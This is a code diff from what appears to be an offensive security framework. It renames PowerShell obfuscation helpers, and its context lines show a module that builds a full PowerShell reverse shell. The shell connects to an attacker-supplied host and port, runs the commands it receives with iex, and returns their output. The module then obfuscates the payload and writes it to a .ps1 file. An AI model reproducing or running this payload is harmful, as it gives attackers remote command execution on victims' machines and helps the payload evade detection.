@@ -5,9 +5,9 @@ from koi.utils.config import CONFIG, TIMEOUTS
 from koi.utils.payloads import get_interfaces
 from koi.utils.ui import yesno
 from koi.utils.ps_obfuscate import (
-    _ps_syntax_obfuscate,
-    _ps_format_obfuscate,
-    _ps_variable_obfuscate,
+    ps_syntax_obfuscate,
+    ps_format_obfuscate,
+    ps_variable_obfuscate,
 )
 
 
@@ -86,9 +86,9 @@ class DuplicateModule(KoiModule):
 
         ps_payload = f"""$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=New-Object byte[] 65536;while(($i=$s.Read($b,0,65536)) -gt 0){{$d=[System.Text.Encoding]::ASCII.GetString($b,0,$i);try{{$o=iex $d 2>&1|Out-String}}catch{{$o=$_|Out-String}};$p=$o+'PS> ';$e=[System.Text.Encoding]::ASCII.GetBytes($p);$s.Write($e,0,$e.Length);$s.Flush()}};$c.Close()"""
 
-        ps_payload = _ps_variable_obfuscate(ps_payload)
-        ps_payload = _ps_format_obfuscate(ps_payload)
-        ps_payload = _ps_syntax_obfuscate(ps_payload)
+        ps_payload = ps_variable_obfuscate(ps_payload)
+        ps_payload = ps_format_obfuscate(ps_payload)
+        ps_payload = ps_syntax_obfuscate(ps_payload)
 
         ps_file = f"ps_{hash(ps_payload) & 0x7FFFFFFF}.ps1"
 
